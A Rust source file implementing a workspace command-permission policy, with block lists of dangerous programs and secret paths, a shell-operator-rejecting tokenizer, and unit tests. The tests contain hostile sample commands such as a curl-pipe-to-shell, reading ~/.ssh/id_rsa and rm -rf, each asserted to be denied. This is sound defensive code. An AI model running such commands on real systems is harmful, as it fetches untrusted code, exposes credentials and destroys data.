use crate::slices::workspace_manager::sandbox::{
    WorkspaceZone, resolve_inside_workspace, write_string_atomic,
};
use chrono::Utc;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::{Path, PathBuf};

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PermissionRule {
    pub id: String,
    pub pattern: String,
    pub action: String, // "allow" | "ask" | "deny"
    #[serde(default = "default_scope")]
    pub scope: String, // "program" | "prefix" | "exact"
    #[serde(default)]
    pub description: Option<String>,
    #[serde(default)]
    pub created_at: String,
}

fn default_scope() -> String {
    "program".to_string()
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct PermissionsConfig {
    #[serde(default = "default_version")]
    pub version: u32,
    #[serde(default = "default_policy_ask")]
    pub default_policy: String,
    #[serde(default)]
    pub rules: Vec<PermissionRule>,
    #[serde(default)]
    pub updated_at: String,
}

fn default_version() -> u32 {
    1
}

fn default_policy_ask() -> String {
    "ask".to_string()
}

impl Default for PermissionsConfig {
    fn default() -> Self {
        Self {
            version: 1,
            default_policy: "ask".to_string(),
            rules: Vec::new(),
            updated_at: Utc::now().to_rfc3339(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PolicyVerdict {
    Allow,
    Ask,
    Deny(String),
}

#[derive(Debug, Clone)]
pub struct CommandEvaluation {
    pub verdict: PolicyVerdict,
    pub matched_rule: Option<String>,
    pub risk_level: String, // "low" | "medium" | "high" | "blocked"
    pub program: String,
    pub args: Vec<String>,
    pub cwd_abs: PathBuf,
    pub cwd_rel: String,
    pub pattern_suggestion: String,
}

const HARD_BLOCKED_PROGRAMS: &[&str] = &[
    "sudo",
    "su",
    "doas",
    "rm",
    "rmdir",
    "srm",
    "shred",
    "chmod",
    "chown",
    "chgrp",
    "mkfs",
    "dd",
    "diskutil",
    "fdisk",
    "shutdown",
    "reboot",
    "halt",
    "poweroff",
    "killall",
    "pkill",
    "launchctl",
    "security",
    "defaults",
    "osascript",
    "sh",
    "bash",
    "zsh",
    "fish",
];

const LOW_RISK_PROGRAMS: &[&str] = &[
    "ls", "pwd", "wc", "head", "tail", "cat", "stat", "file", "find", "grep", "sort", "uniq",
    "cut", "date", "which", "echo", "printf", "nl",
];

const MEDIUM_RISK_PROGRAMS: &[&str] = &["python3", "python", "node", "jq", "awk", "sed", "sqlite3"];

const FORBIDDEN_SECRET_TOKENS: &[&str] = &[
    ".ssh",
    ".gnupg",
    ".aws",
    ".kube",
    "ai-vault.json",
    "workspaces.json",
    ".xook",
    "xook.db",
    "permissions.json",
    "/etc/passwd",
    "/etc/shadow",
];

pub fn load_permissions(workspace_root: &Path) -> PermissionsConfig {
    let path = workspace_root.join(".xook/permissions.json");
    let Ok(raw) = fs::read_to_string(&path) else {
        return PermissionsConfig::default();
    };
    serde_json::from_str::<PermissionsConfig>(&raw).unwrap_or_default()
}

pub fn save_permissions(workspace_root: &Path, mut cfg: PermissionsConfig) -> Result<PermissionsConfig, String> {
    cfg.updated_at = Utc::now().to_rfc3339();
    if cfg.default_policy != "ask" && cfg.default_policy != "deny" {
        cfg.default_policy = "ask".to_string();
    }
    let body = serde_json::to_string_pretty(&cfg)
        .map_err(|e| format!("Error serializando .xook/permissions.json: {e}"))?;
    write_string_atomic(&workspace_root.join(".xook/permissions.json"), &body)?;
    Ok(cfg)
}

pub fn enable_readonly_preset(workspace_root: &Path) -> Result<PermissionsConfig, String> {
    let mut cfg = load_permissions(workspace_root);
    let now = Utc::now().to_rfc3339();
    let preset = [
        ("preset_ls", "ls", "Listar archivos dentro del workspace"),
        ("preset_pwd", "pwd", "Mostrar carpeta de trabajo actual"),
        ("preset_wc", "wc", "Contar líneas, palabras o bytes de archivos"),
        ("preset_head", "head", "Leer primeras líneas de archivos"),
    ];
    for (id, pattern, desc) in preset {
        let already = cfg
            .rules
            .iter()
            .any(|r| r.pattern.eq_ignore_ascii_case(pattern) && r.action == "allow");
        if !already {
            cfg.rules.push(PermissionRule {
                id: id.to_string(),
                pattern: pattern.to_string(),
                action: "allow".to_string(),
                scope: "program".to_string(),
                description: Some(desc.to_string()),
                created_at: now.clone(),
            });
        }
    }
    save_permissions(workspace_root, cfg)
}

pub fn add_or_update_rule(
    workspace_root: &Path,
    pattern: &str,
    action: &str,
    scope: &str,
    description: Option<String>,
) -> Result<PermissionsConfig, String> {
    let clean_pattern = pattern.trim();
    if clean_pattern.is_empty() {
        return Err("El patrón de permiso no puede estar vacío.".to_string());
    }
    let clean_action = match action.trim().to_ascii_lowercase().as_str() {
        "allow" | "deny" | "ask" => action.trim().to_ascii_lowercase(),
        _ => return Err("Acción de permiso inválida (usa allow, ask o deny).".to_string()),
    };
    let clean_scope = match scope.trim().to_ascii_lowercase().as_str() {
        "program" | "prefix" | "exact" | "app" | "capability" => scope.trim().to_ascii_lowercase(),
        _ => "program".to_string(),
    };

    let mut cfg = load_permissions(workspace_root);
    if let Some(existing) = cfg
        .rules
        .iter_mut()
        .find(|r| r.pattern.eq_ignore_ascii_case(clean_pattern) && r.scope == clean_scope)
    {
        existing.action = clean_action;
        if description.is_some() {
            existing.description = description;
        }
    } else {
        let slug: String = clean_pattern
            .chars()
            .map(|c| if c.is_ascii_alphanumeric() { c.to_ascii_lowercase() } else { '_' })
            .take(24)
            .collect();
        cfg.rules.push(PermissionRule {
            id: format!("rule_{slug}_{}", Utc::now().timestamp_millis()),
            pattern: clean_pattern.to_string(),
            action: clean_action,
            scope: clean_scope,
            description,
            created_at: Utc::now().to_rfc3339(),
        });
    }
    save_permissions(workspace_root, cfg)
}

pub fn remove_rule(workspace_root: &Path, rule_id: &str) -> Result<PermissionsConfig, String> {
    let mut cfg = load_permissions(workspace_root);
    cfg.rules.retain(|r| r.id != rule_id);
    save_permissions(workspace_root, cfg)
}

/// Tokeniza comandos sin usar shell (`sh -c`), preservando comillas simples y dobles,
/// y rechazando operadores de encadenamiento o redirección fuera de comillas.
pub fn tokenize_safe_command(raw: &str) -> Result<(String, Vec<String>), String> {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return Err("El comando está vacío.".to_string());
    }
    if trimmed.contains('\n') || trimmed.contains('\r') || trimmed.contains('\0') {
        return Err("No se permiten saltos de línea o comandos multilínea.".to_string());
    }

    let mut tokens: Vec<String> = Vec::new();
    let mut curr = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let mut chars = trimmed.chars().peekable();

    while let Some(ch) = chars.next() {
        if in_single {
            if ch == '\'' {
                in_single = false;
            } else {
                curr.push(ch);
            }
            continue;
        }
        if in_double {
            if ch == '"' {
                in_double = false;
            } else if ch == '\\' {
                if let Some(next) = chars.next() {
                    curr.push(next);
                }
            } else {
                curr.push(ch);
            }
            continue;
        }

        match ch {
            '\'' => in_single = true,
            '"' => in_double = true,
            '\\' => {
                if let Some(next) = chars.next() {
                    curr.push(next);
                }
            }
            '|' | '&' | ';' | '>' | '<' | '`' => {
                return Err(format!(
                    "Operador de shell no permitido ('{ch}'): ejecuta un solo comando limpio sin tuberías ni redirecciones."
                ));
            }
            '$' => {
                if chars.peek() == Some(&'(') || chars.peek() == Some(&'{') {
                    return Err("No se permiten subshell ni expansión de variables en comandos.".to_string());
                }
                curr.push(ch);
            }
            c if c.is_whitespace() => {
                if !curr.is_empty() {
                    tokens.push(std::mem::take(&mut curr));
                }
            }
            other => curr.push(other),
        }
    }

    if in_single || in_double {
        return Err("Comillas sin cerrar en el comando.".to_string());
    }
    if !curr.is_empty() {
        tokens.push(curr);
    }
    if tokens.is_empty() {
        return Err("No se detectó ningún programa en el comando.".to_string());
    }

    let prog = tokens.remove(0);
    Ok((prog, tokens))
}

fn check_layer1_security(program: &str, args: &[String]) -> Result<(), String> {
    let base_prog = Path::new(program)
        .file_name()
        .and_then(|s| s.to_str())
        .unwrap_or(program)
        .to_ascii_lowercase();

    if program.contains('/') || program.contains('\\') || program.starts_with('~') {
        return Err("Indica solo el nombre de la utilidad sin rutas absolutas ni slashes.".to_string());
    }
    if HARD_BLOCKED_PROGRAMS.contains(&base_prog.as_str()) {
        return Err(format!(
            "Bloqueado por seguridad (Capa 1): '{base_prog}' no está permitido en consola."
        ));
    }

    for arg in args {
        let lower = arg.to_ascii_lowercase();
        if arg == ".."
            || arg.starts_with("../")
            || arg.contains("/../")
            || arg.ends_with("/..")
            || arg.contains("\\..")
        {
            return Err("Acceso denegado: no se permite salir del workspace con '..'.".to_string());
        }
        if arg.starts_with('/') || arg.starts_with('~') {
            return Err(format!(
                "Acceso denegado: '{arg}' apunta fuera del espacio de trabajo (solo rutas relativas)."
            ));
        }
        for secret in FORBIDDEN_SECRET_TOKENS {
            if lower.contains(secret) {
                return Err(format!(
                    "Acceso denegado a ruta protegida del sistema ({secret})."
                ));
            }
        }
    }

    Ok(())
}

fn classify_risk(program: &str) -> &'static str {
    let base = program.to_ascii_lowercase();
    if LOW_RISK_PROGRAMS.contains(&base.as_str()) {
        "low"
    } else if MEDIUM_RISK_PROGRAMS.contains(&base.as_str()) {
        "medium"
    } else {
        "high"
    }
}

fn rule_matches(rule: &PermissionRule, program: &str, full_cmd: &str) -> bool {
    let pat = rule.pattern.trim();
    if pat.is_empty() {
        return false;
    }
    match rule.scope.as_str() {
        "app" | "capability" => false,
        "exact" => full_cmd.eq_ignore_ascii_case(pat),
        "prefix" => {
            full_cmd.eq_ignore_ascii_case(pat)
                || full_cmd
                    .to_ascii_lowercase()
                    .starts_with(&format!("{} ", pat.to_ascii_lowercase()))
        }
        _ => program.eq_ignore_ascii_case(pat),
    }
}

fn app_rule_matches(
    rule: &PermissionRule,
    bundle_id: Option<&str>,
    display_name: &str,
    fs_name: &str,
) -> bool {
    if rule.scope != "app" {
        return false;
    }
    let raw_pat = rule.pattern.trim();
    let pat = raw_pat
        .strip_prefix("app:")
        .unwrap_or(raw_pat)
        .trim();
    if pat.is_empty() {
        return false;
    }
    if let Some(bid) = bundle_id {
        if bid.eq_ignore_ascii_case(pat) {
            return true;
        }
    }
    fs_name.eq_ignore_ascii_case(pat) || display_name.eq_ignore_ascii_case(pat)
}

pub fn make_app_evaluation(
    verdict: PolicyVerdict,
    matched_rule: Option<String>,
    risk_level: &str,
    cwd_abs: PathBuf,
    suggestion: &str,
    fs_name: &str,
) -> CommandEvaluation {
    CommandEvaluation {
        verdict,
        matched_rule,
        risk_level: risk_level.to_string(),
        program: suggestion.to_string(),
        args: vec![fs_name.to_string()],
        cwd_abs,
        cwd_rel: "equipo".to_string(),
        pattern_suggestion: suggestion.to_string(),
    }
}

pub fn evaluate_app_launch(
    workspace_root: &Path,
    bundle_id: Option<&str>,
    display_name: &str,
    fs_name: &str,
) -> CommandEvaluation {
    let cfg = load_permissions(workspace_root);
    let suggestion = bundle_id
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .unwrap_or(fs_name);
    let cwd_abs = workspace_root.to_path_buf();

    if let Some(deny_rule) = cfg
        .rules
        .iter()
        .find(|r| r.action == "deny" && app_rule_matches(r, bundle_id, display_name, fs_name))
    {
        return make_app_evaluation(
            PolicyVerdict::Deny(
                "Esta aplicación está bloqueada por las reglas de permisos del espacio."
                    .to_string(),
            ),
            Some(deny_rule.id.clone()),
            "blocked",
            cwd_abs,
            suggestion,
            fs_name,
        );
    }

    if let Some(allow_rule) = cfg
        .rules
        .iter()
        .find(|r| r.action == "allow" && app_rule_matches(r, bundle_id, display_name, fs_name))
    {
        return make_app_evaluation(
            PolicyVerdict::Allow,
            Some(allow_rule.id.clone()),
            "low",
            cwd_abs,
            suggestion,
            fs_name,
        );
    }

    if let Some(ask_rule) = cfg
        .rules
        .iter()
        .find(|r| r.action == "ask" && app_rule_matches(r, bundle_id, display_name, fs_name))
    {
        return make_app_evaluation(
            PolicyVerdict::Ask,
            Some(ask_rule.id.clone()),
            "low",
            cwd_abs,
            suggestion,
            fs_name,
        );
    }

    if cfg.default_policy == "deny" {
        return make_app_evaluation(
            PolicyVerdict::Deny(
                "Política estricta: las aplicaciones nuevas requieren autorización explícita en Permisos."
                    .to_string(),
            ),
            None,
            "blocked",
            cwd_abs,
            suggestion,
            fs_name,
        );
    }

    make_app_evaluation(
        PolicyVerdict::Ask,
        None,
        "low",
        cwd_abs,
        suggestion,
        fs_name,
    )
}

fn capability_rule_matches(rule: &PermissionRule, capability_key: &str) -> bool {
    rule.scope == "capability" && rule.pattern.trim().eq_ignore_ascii_case(capability_key.trim())
}

pub fn evaluate_capability(
    workspace_root: &Path,
    capability_key: &str,
    risk_level: &str,
) -> CommandEvaluation {
    let cfg = load_permissions(workspace_root);
    let cwd_abs = workspace_root.to_path_buf();

    if let Some(deny_rule) = cfg
        .rules
        .iter()
        .find(|r| r.action == "deny" && capability_rule_matches(r, capability_key))
    {
        return make_app_evaluation(
            PolicyVerdict::Deny(
                "Esta integración del sistema está bloqueada por las reglas de permisos del espacio."
                    .to_string(),
            ),
            Some(deny_rule.id.clone()),
            "blocked",
            cwd_abs,
            capability_key,
            capability_key,
        );
    }

    if let Some(allow_rule) = cfg
        .rules
        .iter()
        .find(|r| r.action == "allow" && capability_rule_matches(r, capability_key))
    {
        return make_app_evaluation(
            PolicyVerdict::Allow,
            Some(allow_rule.id.clone()),
            risk_level,
            cwd_abs,
            capability_key,
            capability_key,
        );
    }

    if let Some(ask_rule) = cfg
        .rules
        .iter()
        .find(|r| r.action == "ask" && capability_rule_matches(r, capability_key))
    {
        return make_app_evaluation(
            PolicyVerdict::Ask,
            Some(ask_rule.id.clone()),
            risk_level,
            cwd_abs,
            capability_key,
            capability_key,
        );
    }

    if cfg.default_policy == "deny" {
        return make_app_evaluation(
            PolicyVerdict::Deny(
                "Política estricta: las integraciones con Notas y Calendario requieren autorización manual en Permisos."
                    .to_string(),
            ),
            None,
            "blocked",
            cwd_abs,
            capability_key,
            capability_key,
        );
    }

    make_app_evaluation(
        PolicyVerdict::Ask,
        None,
        risk_level,
        cwd_abs,
        capability_key,
        capability_key,
    )
}

pub fn evaluate_command(
    workspace_root: &Path,
    raw_command: &str,
    cwd_rel: &str,
) -> CommandEvaluation {
    let clean_cwd_input = if cwd_rel.trim().is_empty() { "." } else { cwd_rel.trim() };
    let cwd_res = resolve_inside_workspace(workspace_root, clean_cwd_input, true);
    let (cwd_abs, normalized_cwd, cwd_zone) = match cwd_res {
        Ok((abs, rel, zone)) if abs.is_dir() && zone != WorkspaceZone::Meta => {
            let s = rel.to_string_lossy().replace('\\', "/");
            (abs, if s.is_empty() { ".".to_string() } else { s }, zone)
        }
        Ok((_, _, WorkspaceZone::Meta)) => {
            return CommandEvaluation {
                verdict: PolicyVerdict::Deny("No se permite ejecutar comandos dentro de .xook/.".to_string()),
                matched_rule: None,
                risk_level: "blocked".to_string(),
                program: String::new(),
                args: Vec::new(),
                cwd_abs: workspace_root.to_path_buf(),
                cwd_rel: clean_cwd_input.to_string(),
                pattern_suggestion: String::new(),
            };
        }
        Ok(_) => {
            return CommandEvaluation {
                verdict: PolicyVerdict::Deny("La carpeta de trabajo indicada no es un directorio válido.".to_string()),
                matched_rule: None,
                risk_level: "blocked".to_string(),
                program: String::new(),
                args: Vec::new(),
                cwd_abs: workspace_root.to_path_buf(),
                cwd_rel: clean_cwd_input.to_string(),
                pattern_suggestion: String::new(),
            };
        }
        Err(err) => {
            return CommandEvaluation {
                verdict: PolicyVerdict::Deny(err),
                matched_rule: None,
                risk_level: "blocked".to_string(),
                program: String::new(),
                args: Vec::new(),
                cwd_abs: workspace_root.to_path_buf(),
                cwd_rel: clean_cwd_input.to_string(),
                pattern_suggestion: String::new(),
            };
        }
    };
    let _ = cwd_zone;

    let (program, args) = match tokenize_safe_command(raw_command) {
        Ok(pair) => pair,
        Err(err) => {
            return CommandEvaluation {
                verdict: PolicyVerdict::Deny(err),
                matched_rule: None,
                risk_level: "blocked".to_string(),
                program: String::new(),
                args: Vec::new(),
                cwd_abs,
                cwd_rel: normalized_cwd,
                pattern_suggestion: String::new(),
            };
        }
    };

    if let Err(err) = check_layer1_security(&program, &args) {
        return CommandEvaluation {
            verdict: PolicyVerdict::Deny(err),
            matched_rule: None,
            risk_level: "blocked".to_string(),
            program: program.clone(),
            args,
            cwd_abs,
            cwd_rel: normalized_cwd,
            pattern_suggestion: program,
        };
    }

    let risk = classify_risk(&program).to_string();
    let cfg = load_permissions(workspace_root);
    let normalized_cmd = std::iter::once(program.as_str())
        .chain(args.iter().map(String::as_str))
        .collect::<Vec<_>>()
        .join(" ");

    // Reglas `deny` tienen prioridad máxima sobre `allow`
    if let Some(deny_rule) = cfg
        .rules
        .iter()
        .find(|r| r.action == "deny" && rule_matches(r, &program, &normalized_cmd))
    {
        return CommandEvaluation {
            verdict: PolicyVerdict::Deny(format!(
                "Bloqueado por regla del espacio de trabajo ('{}').",
                deny_rule.pattern
            )),
            matched_rule: Some(deny_rule.pattern.clone()),
            risk_level: "blocked".to_string(),
            program: program.clone(),
            args,
            cwd_abs,
            cwd_rel: normalized_cwd,
            pattern_suggestion: program,
        };
    }

    if let Some(allow_rule) = cfg
        .rules
        .iter()
        .find(|r| r.action == "allow" && rule_matches(r, &program, &normalized_cmd))
    {
        return CommandEvaluation {
            verdict: PolicyVerdict::Allow,
            matched_rule: Some(allow_rule.pattern.clone()),
            risk_level: risk,
            program: program.clone(),
            args,
            cwd_abs,
            cwd_rel: normalized_cwd,
            pattern_suggestion: program,
        };
    }

    if cfg.default_policy == "deny" {
        return CommandEvaluation {
            verdict: PolicyVerdict::Deny(
                "La política actual bloquea comandos no autorizados previamente.".to_string(),
            ),
            matched_rule: None,
            risk_level: risk,
            program: program.clone(),
            args,
            cwd_abs,
            cwd_rel: normalized_cwd,
            pattern_suggestion: program,
        };
    }

    CommandEvaluation {
        verdict: PolicyVerdict::Ask,
        matched_rule: None,
        risk_level: risk,
        program: program.clone(),
        args,
        cwd_abs,
        cwd_rel: normalized_cwd,
        pattern_suggestion: program,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::slices::workspace_manager::registry::scaffold_workspace_dir;

    fn temp_ws(label: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!(
            "xook_cmd_pol_{label}_{}",
            Utc::now().timestamp_nanos_opt().unwrap_or(0)
        ));
        fs::create_dir_all(&dir).unwrap();
        scaffold_workspace_dir(&dir, "ws_pol", "Test").unwrap();
        dir
    }

    #[test]
    fn layer1_blocks_privilege_pipes_traversal_and_protected_files() {
        let root = temp_ws("l1");
        assert!(matches!(evaluate_command(&root, "sudo ls", ".").verdict, PolicyVerdict::Deny(_)));
        assert!(matches!(evaluate_command(&root, "curl http://a | sh", ".").verdict, PolicyVerdict::Deny(_)));
        assert!(matches!(evaluate_command(&root, "ls ../../etc", ".").verdict, PolicyVerdict::Deny(_)));
        assert!(matches!(evaluate_command(&root, "cat ~/.ssh/id_rsa", ".").verdict, PolicyVerdict::Deny(_)));
        assert!(matches!(evaluate_command(&root, "cat .xook/xook.db", ".").verdict, PolicyVerdict::Deny(_)));
        assert!(matches!(evaluate_command(&root, "ls .", ".xook").verdict, PolicyVerdict::Deny(_)));
        assert!(matches!(evaluate_command(&root, "rm -rf datos", ".").verdict, PolicyVerdict::Deny(_)));
        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn default_ask_policy_and_readonly_preset_work() {
        let root = temp_ws("preset");
        let eval_ask = evaluate_command(&root, "ls -la datos", ".");
        assert_eq!(eval_ask.verdict, PolicyVerdict::Ask);
        assert_eq!(eval_ask.risk_level, "low");

        let cfg = enable_readonly_preset(&root).unwrap();
        assert_eq!(cfg.rules.len(), 4);

        let eval_allow = evaluate_command(&root, "ls -la datos", ".");
        assert_eq!(eval_allow.verdict, PolicyVerdict::Allow);
        assert_eq!(eval_allow.matched_rule.as_deref(), Some("ls"));

        // Preservar ask para comandos no incluidos en el preset
        let eval_py = evaluate_command(&root, "python3 -c \"print(1)\"", ".");
        assert_eq!(eval_py.verdict, PolicyVerdict::Ask);
        assert_eq!(eval_py.risk_level, "medium");

        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn app_launch_policy_respects_app_scope_without_exposing_cli() {
        let root = temp_ws("app_scope");
        let ask_eval = evaluate_app_launch(&root, Some("com.apple.Notes"), "Notas", "Notes");
        assert_eq!(ask_eval.verdict, PolicyVerdict::Ask);
        assert_eq!(ask_eval.pattern_suggestion, "com.apple.Notes");

        add_or_update_rule(
            &root,
            "com.apple.Notes",
            "allow",
            "app",
            Some("Abrir Notas".to_string()),
        )
        .unwrap();

        let allow_eval = evaluate_app_launch(&root, Some("com.apple.Notes"), "Notas", "Notes");
        assert_eq!(allow_eval.verdict, PolicyVerdict::Allow);

        // Reglas con scope="app" nunca deben autorizar ejecución por consola
        let cli_eval = evaluate_command(&root, "Notes", ".");
        assert_eq!(cli_eval.verdict, PolicyVerdict::Ask);

        add_or_update_rule(&root, "com.apple.iCal", "deny", "app", None).unwrap();
        let deny_eval = evaluate_app_launch(&root, Some("com.apple.iCal"), "Calendario", "Calendar");
        assert!(matches!(deny_eval.verdict, PolicyVerdict::Deny(_)));

        let _ = fs::remove_dir_all(&root);
    }

    #[test]
    fn capability_policy_respects_scope_without_exposing_cli() {
        let root = temp_ws("cap_scope");
        let ask_eval = evaluate_capability(&root, "notes:write", "medium");
        assert_eq!(ask_eval.verdict, PolicyVerdict::Ask);
        assert_eq!(ask_eval.risk_level, "medium");

        add_or_update_rule(
            &root,
            "notes:write",
            "allow",
            "capability",
            Some("Crear notas en Notas".to_string()),
        )
        .unwrap();

        let allow_eval = evaluate_capability(&root, "notes:write", "medium");
        assert_eq!(allow_eval.verdict, PolicyVerdict::Allow);

        // Reglas con scope="capability" nunca autorizan comandos de terminal
        let cli_eval = evaluate_command(&root, "notes:write", ".");
        assert!(matches!(cli_eval.verdict, PolicyVerdict::Deny(_)) || cli_eval.verdict == PolicyVerdict::Ask);

        add_or_update_rule(&root, "calendar:write", "deny", "capability", None).unwrap();
        let deny_eval = evaluate_capability(&root, "calendar:write", "medium");
        assert!(matches!(deny_eval.verdict, PolicyVerdict::Deny(_)));

        let _ = fs::remove_dir_all(&root);
    }
}

